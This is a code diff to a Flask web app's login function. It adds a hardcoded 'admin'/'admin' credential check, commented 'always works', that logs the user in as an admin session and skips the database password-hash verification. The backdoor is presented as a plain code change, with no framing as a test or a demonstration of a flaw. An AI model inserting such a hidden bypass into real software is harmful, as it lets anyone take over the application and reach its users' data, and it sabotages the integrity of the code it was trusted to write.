@@ -549,6 +549,13 @@ def login():
         username = request.form.get('username')
         password = request.form.get('password')
         
+        # 🔑 ADMIN LOGIN (always works)
+        if username == "admin" and password == "admin":
+            session['user_id'] = 0
+            session['username'] = "admin"
+            return redirect(url_for('dashboard'))
+        
+        # 🧾 DATABASE LOGIN
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute('SELECT id, password_hash FROM users WHERE username = ?', (username,))
@@ -563,7 +570,6 @@ def login():
         flash('Invalid credentials', 'error')
     
     return render_template('login.html')
-
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
